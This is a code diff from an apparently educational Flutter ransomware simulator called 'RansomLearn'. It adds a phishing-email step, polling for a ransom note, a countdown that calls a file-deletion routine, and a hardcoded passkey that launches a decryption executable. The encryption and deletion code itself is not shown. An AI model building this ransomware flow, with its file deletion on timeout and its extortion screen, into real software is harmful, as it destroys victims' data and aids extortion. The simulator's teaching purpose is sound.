@@ -4,7 +4,7 @@ import 'package:http/http.dart' as http;
 import 'package:ransom_learn/file_manager.dart';
 import 'dart:convert';
 import 'dart:io';
-
+import 'delete_files.dart';
 
 
 void main() {
@@ -149,8 +149,9 @@ class _AuthPageState extends State<AuthPage> {
       );
 
       if (isLogin) {
-        navigateToEmailPage(); // Move to the next screen after login
         setupRansomLearnEnvironment();
+        navigateToEmailPage(); // Move to the next screen after login
+        
       } else {
         setState(() {
           isLogin = true; // Switch to login page after signup
@@ -269,26 +270,6 @@ class _EmailPageState extends State<EmailPage> {
   final TextEditingController _emailController = TextEditingController();
   bool _isSending = false;
 
-  void checkForRansomNote(Function startTimer) {
-  String ransomNotePath = "C:\\Users\\yohan\\OneDrive\\Desktop\\RansomLearn\\RansomNote.txt";
-
-  Timer.periodic(Duration(seconds: 5), (timer) {
-  String? desktopPath = getDesktopPath();
-  if (desktopPath != null) {
-    String ransomNotePath = "$desktopPath\\RansomLearn\\RansomNote.txt";
-    print("Ransom note path: $ransomNotePath");
-  } else {
-    print("Error: Desktop path not found!");
-  }
-
-    if (File(ransomNotePath).existsSync()) {
-      print("Ransom note detected. Starting countdown...");
-      startTimer(); // Call the function that starts the timer
-      timer.cancel(); // Stop checking after detecting the note
-    }
-  });
-}
-
   Future<void> sendPhishingEmail() async {
     if (_emailController.text.isEmpty) {
       ScaffoldMessenger.of(context).showSnackBar(
@@ -317,10 +298,22 @@ class _EmailPageState extends State<EmailPage> {
         SnackBar(content: Text('Phishing email sent successfully!')),
       );
       // Navigate to RansomNotePage AFTER email is sent
-      Navigator.push(
-        context,
-        MaterialPageRoute(builder: (context) => RansomNotePage()),
-      );
+      String ransomNotePath = "C:\\Users\\yohan\\OneDrive\\Desktop\\RansomLearn\\RansomNote.txt";
+
+      Timer.periodic(Duration(seconds: 5), (timer) {
+      String? desktopPath = getDesktopPath();
+      if (desktopPath != null) {
+        String ransomNotePath = "$desktopPath\\RansomLearn\\RansomNote.txt";
+      }    
+      if (File(ransomNotePath).existsSync()) {
+          Navigator.push(
+          context,
+          MaterialPageRoute(builder: (context) => RansomNotePage()),
+        );
+          timer.cancel(); // Stop checking after detecting the note
+        }
+      });
+      
     } else {
       ScaffoldMessenger.of(context).showSnackBar(
         SnackBar(content: Text('Failed to send email')),
@@ -331,6 +324,24 @@ class _EmailPageState extends State<EmailPage> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
+      appBar: AppBar(
+        title: Text(
+          'Target Email',
+          style: TextStyle(color: Colors.white), // White text color
+        ),
+        leading: IconButton(
+          icon: Icon(
+            Icons.arrow_back,
+            color: Colors.white, // White back arrow
+          ),
+          onPressed: () {
+            Navigator.pop(context); // This will take you back to the previous page
+          },
+        ),
+        backgroundColor: Color.fromARGB(255, 240, 74, 24), 
+        elevation: 0, // Remove shadow for a flat look
+        toolbarHeight: 50, // Adjust height of the AppBar (default is 56)
+      ),
       body: Stack(
         fit: StackFit.expand,
         children: [
@@ -484,6 +495,7 @@ class _RansomNotePageState extends State<RansomNotePage> {
         } else {
           timer.cancel();
           _showDeletionDialog();
+          deleteFiles();
         }
       });
     }
@@ -492,12 +504,36 @@ class _RansomNotePageState extends State<RansomNotePage> {
 
   void _checkPasskey() {
     String enteredPasskey = _passkeyController.text;
-    if (enteredPasskey == 'correct_passkey') {
+    if (enteredPasskey == 'Ransom@Learn') {
+      _timer?.cancel();
+      _runDecryptionExe();
       ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(content: Text('Passkey accepted. Files decrypted!')),
+        SnackBar(content: Text('Passkey accepted. Files decrypting..')),
       );
     } else {
       _showWarningDialog();
+    }
+  }
+
+  Future<void> _runDecryptionExe() async {
+    try {
+      // Adjust the path to the exe file
+      String exePath = "${Directory.current.path}\\lib\\script_decrypt.exe";
+      ProcessResult result = await Process.run(exePath, []);
+
+      if (result.exitCode == 0) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text("Decryption successful!")),
+        );
+      } else {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text("Error: ${result.stderr}")),
+        );
+      }
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        SnackBar(content: Text("Failed to execute script: $e")),
+      );
     }
   }
 
@@ -554,6 +590,25 @@ class _RansomNotePageState extends State<RansomNotePage> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
+      appBar: AppBar(
+        title: Text(
+          'Pass Key',
+          style: TextStyle(color: Colors.white), // White text color
+        ),
+        leading: IconButton(
+          icon: Icon(
+            Icons.arrow_back,
+            color: Colors.white, // White back arrow
+          ),
+          onPressed: () {
+            setupRansomLearnEnvironment();
+            Navigator.pop(context); // This will take you back to the previous page
+          },
+        ),
+        backgroundColor: Color.fromARGB(255, 4, 4, 4), 
+        elevation: 0, // Remove shadow for a flat look
+        toolbarHeight: 50, // Adjust height of the AppBar (default is 56)
+      ),
       body: Stack(
         fit: StackFit.expand,
         children: [
@@ -566,7 +621,7 @@ class _RansomNotePageState extends State<RansomNotePage> {
               width: 350,
               padding: EdgeInsets.all(20),
               decoration: BoxDecoration(
-                color: Colors.red.shade900.withOpacity(0.9),
+                color: const Color.fromARGB(255, 68, 67, 67).withOpacity(0.9),
                 borderRadius: BorderRadius.circular(12),
               ),
               child: Column(
